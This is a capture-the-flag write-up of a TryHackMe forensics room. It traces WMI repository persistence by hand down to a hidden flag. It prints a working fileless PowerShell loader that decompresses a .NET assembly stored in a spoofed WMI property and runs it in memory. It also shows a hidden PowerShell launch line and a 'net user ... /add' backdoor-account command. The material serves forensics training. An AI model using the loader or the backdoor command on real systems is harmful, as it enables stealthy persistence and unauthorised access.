# After Hours - Write-ups

**Room:** https://tryhackme.com/room/hh-afterhours-b090d1f0
**Category:** Forensics / Windows / Persistence / Reverse Engineering

## Objective
Parse the provided WMI repository artefacts by hand, locate a malicious custom WMI class, extract its embedded payload, decode it, and recover the hidden flag.

---

## Skills Practised
- Windows Forensics (WMI CIM Repository Analysis)
- Manual Artefact Parsing (no automated persistence/autoruns tooling)
- Base64 / Deflate Decoding
- .NET (PE/Mono) Binary String Analysis
- Reverse Engineering of a Loader Payload

---

## Investigation Steps

### Step 1 – Read the Challenge
The briefing described back-office machines being accessed during off-hours, with nothing showing up in Startup, Scheduled Tasks, or Run keys — the classic places persistence tools check. The hint pointed toward somewhere "quieter," and a community post reinforced that standard autoruns tools "straight up don't catch this one," meaning the data would need to be examined manually.

---

### Step 2 – Identify the Artefacts
The provided files were:

```
INDEX.BTR
MAPPING1.MAP
MAPPING2.MAP
MAPPING3.MAP
OBJECTS.DATA
```

These are the raw components of the **Windows WMI (Windows Management Instrumentation) CIM repository** — the database WMI uses to store both built-in and custom classes. Because most persistence-hunting tools don't parse this repository, it's a known real-world technique for advanced malware to hide malicious classes and payload data here.

---

### Step 3 – Search for Indicators of Persistence
Rather than relying on a specialised parser, `OBJECTS.DATA` (the largest file, containing the actual class/instance data) was searched directly for readable text:

```bash
strings -n 8 OBJECTS.DATA | grep -iE "powershell|base64|EventConsumer|EventFilter|CommandLineTemplate"
```

This surfaced the standard built-in WMI event consumer classes (`__EventFilter`, `CommandLineEventConsumer`, etc.) as well as a suspicious repeated custom class name:

```
WmiExpense
```

This is not a legitimate Windows class — a strong indicator of attacker-created persistence.

---

### Step 4 – Locate and Decode the PowerShell Loader
A base64-encoded blob was found near the malicious class references:

```bash
strings -n 6 OBJECTS.DATA | grep -i "powershell"
```

This returned a command of the form:

```
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <base64 blob>
```

PowerShell's `-enc` flag expects **UTF-16LE base64**, so it was decoded accordingly:

```bash
base64 -d ps_b64.txt | iconv -f utf-16le -t utf-8
```

The decoded script revealed a loader:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
        [IO.MemoryStream][Convert]::FromBase64String($file),
        [IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

**What this does:** it reads a base64 string stored in a spoofed WMI property (`Win32_HardwareTelemetry.ConfigData`), Deflate-decompresses it, and loads the resulting bytes directly into memory as a **.NET assembly**, then executes its entry point — fileless execution entirely from within the WMI repository.

---

### Step 5 – Extract and Decode the Embedded Payload
A second, larger base64 blob was found adjacent to the loader script in `OBJECTS.DATA` — this is the `ConfigData` payload referenced above.

```bash
base64 -d payload_b64.txt > payload.deflate
python3 -c "
import zlib
data = open('payload.deflate','rb').read()
out = zlib.decompress(data, -15)   # raw Deflate, no zlib header
open('payload.decompressed','wb').write(out)
"
```

The decompressed output was confirmed to be a valid file:

```bash
file payload.decompressed
# payload.decompressed: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

---

### Step 6 – Extract Strings from the Recovered Assembly
.NET strings are stored as UTF-16, so both ASCII and Unicode string extraction were used:

```bash
strings -n 4 payload.decompressed
strings -e l -n 4 payload.decompressed
```

The Unicode pass revealed the payload's actual malicious action:

```
bytelotusdc
cmd.exe
/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
Execution halted: Environment mismatch.
```

The assembly creates a local backdoor account named **`patch`**, using a base64 string as the account password — this is where the flag was hidden.

---

### Step 7 – Decode the Final Flag
```bash
echo "VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9" | base64 -d
```

**Result:**
```
THM{...}
```

---

## Attack Chain Summary

```
WMI CIM repository files (OBJECTS.DATA etc.)
        ↓
Manual strings search reveals custom class "WmiExpense"
        ↓
Base64 (UTF-16LE) PowerShell loader found
        ↓
Loader reads "ConfigData" property → Base64 decode → Deflate decompress
        ↓
Result is a .NET assembly (PE32/Mono), loaded and run entirely in memory
        ↓
Assembly strings reveal: net user patch <base64> /add
        ↓
Base64-decode the "password" → FLAG
```

---

## What I Learned
- WMI's CIM repository (`OBJECTS.DATA`, `INDEX.BTR`, `MAPPING*.MAP`) is a legitimate real-world persistence hiding spot, since most autoruns/persistence tools don't parse it.
- Attackers commonly abuse **spoofed or lesser-known WMI class/property names** (here, `Win32_HardwareTelemetry.ConfigData`) to store payloads disguised as configuration data.
- PowerShell's `-enc`/`-EncodedCommand` flag always uses **UTF-16LE base64**, not standard UTF-8 base64 — decoding requires an extra `iconv` step.
- .NET's `DeflateStream` uses **raw Deflate** (no zlib/gzip header), so decompression tools must be told to skip header parsing (`zlib.decompress(data, -15)` in Python, or equivalent).
- Fileless malware can be loaded and executed entirely from memory via `Reflection.Assembly.Load()`, leaving no file on disk — the payload only ever exists inside the WMI repository and process memory.
- Extracting strings from a suspected malicious binary should always include a **Unicode/UTF-16 pass** (`strings -e l`), not just ASCII, since .NET strings are stored as UTF-16 internally.

---

## Tools Used
- `strings` (ASCII and UTF-16 modes)
- `base64` (CLI decoding)
- `iconv` (UTF-16LE → UTF-8 conversion)
- Python 3 + `zlib` (raw Deflate decompression)
- `file` (binary type identification)

---

## Key Takeaways
- When standard persistence-hunting tools report "nothing found," check less-obvious data stores like the WMI repository directly.
- Layered encoding (base64 → compression → binary → base64 again) is a common obfuscation technique; peel back one layer at a time and re-inspect after each step.
- Custom or renamed WMI classes/properties that don't match known Microsoft naming conventions are a strong red flag during manual review.
- Always dump both ASCII and Unicode strings when analyzing Windows binaries — critical evidence is often UTF-16 encoded.
